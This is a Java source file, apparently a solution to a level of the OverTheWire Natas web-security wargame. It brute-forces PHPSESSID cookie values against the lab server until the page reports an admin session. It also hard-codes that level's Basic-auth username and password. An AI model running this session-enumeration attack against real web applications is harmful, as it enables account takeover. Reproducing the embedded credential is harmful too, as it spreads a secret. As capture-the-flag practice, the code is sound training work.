package natas;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.util.Base64;

public class Natas3 {

	static String caracteres = "azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN0123456789";

	public static void main(String[] args) throws Exception {

		int id = 0;

		while (!envoyerRequete(String.valueOf(id))) {
			id++;
		}

	}

	static boolean envoyerRequete(String param) throws IOException {

		HttpURLConnection connection = null;
		Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("", 0));
		URL url = new URL("http://natas18.natas.labs.overthewire.org/index.php?debug");
		connection = (HttpURLConnection) url.openConnection(proxy);
		connection.setRequestMethod("POST");
		connection.setRequestProperty("Authorization",
				"Basic " + Base64.getEncoder().encodeToString("natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP".getBytes()));
		connection.setRequestProperty("Cookie", "PHPSESSID=" + param);

		// We send a content
		connection.setDoOutput(false);

		// Get Response
		InputStream is = connection.getInputStream();
		BufferedReader rd = new BufferedReader(new InputStreamReader(is));
		StringBuilder response = new StringBuilder();
		String line;
		while ((line = rd.readLine()) != null) {
			response.append(line);
			response.append('\r');
		}

		rd.close();
		boolean exact = response.toString().contains("You are an admin");
		if (exact) {
			System.out.println(response.toString());
		}
		return exact;

	}

}
